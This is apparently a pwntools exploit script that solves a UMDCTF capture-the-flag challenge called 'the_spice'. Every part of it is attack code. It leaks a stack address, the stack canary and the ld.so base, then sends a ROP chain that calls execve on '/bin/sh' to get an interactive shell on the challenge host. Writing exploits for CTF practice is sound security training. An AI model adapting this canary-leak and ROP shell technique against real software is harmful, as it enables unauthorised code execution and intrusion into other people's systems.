from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./the_spice"
libc = ELF("libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("challs.umdctf.io", 31721)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x00000000004017ef
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)

def leak(ind):
    sl(b"3")
    sl(f"{ind}".encode())
    ru(f"Buyer {ind}: ".encode())
    tmp1 = u32(re(4))
    ru(b"allocated ")
    tmp2 = int(rl().strip().split()[0])
    return (tmp1, tmp2)

r = start()

sys = 0x0000000000401274

sl(b"4")
ru(b"here's what it saw: ")

stack = int(rl().strip(), 16)
ic(hex(stack))
sh = stack - 0x64

# Canary leak
x1, x2 = leak(9)
ic(x1, x2)
can = int(x1 << (4*8)) + int(x2)
ic(hex(can))

#ld leak
x1, x2 = leak(13)
ic(hex(x1%0x10000), hex(x2))
ld = int((x1%0x10000) << (4*8)) + int(x2) - 0x3a040
ic(hex(ld))

poprax = ld + 0x0000000000020322 # pop rax, rdx, rbx
poprdi = ld + 0x000000000000351e
poprsi = ld + 0x00000000000054da

sl(b"1")
sl(b"7")
sl(b"500")
sl(b"/bin/sh\0" + b"A"*(cyclic_find(0x6161616d6161616c)-8) + p64(can) + p64(1) + p64(poprax) + p64(0x3b) + p64(0)*2 + p64(poprdi) + p64(sh) + p64(poprsi) + p64(0)+ p64(sys))

r.interactive()
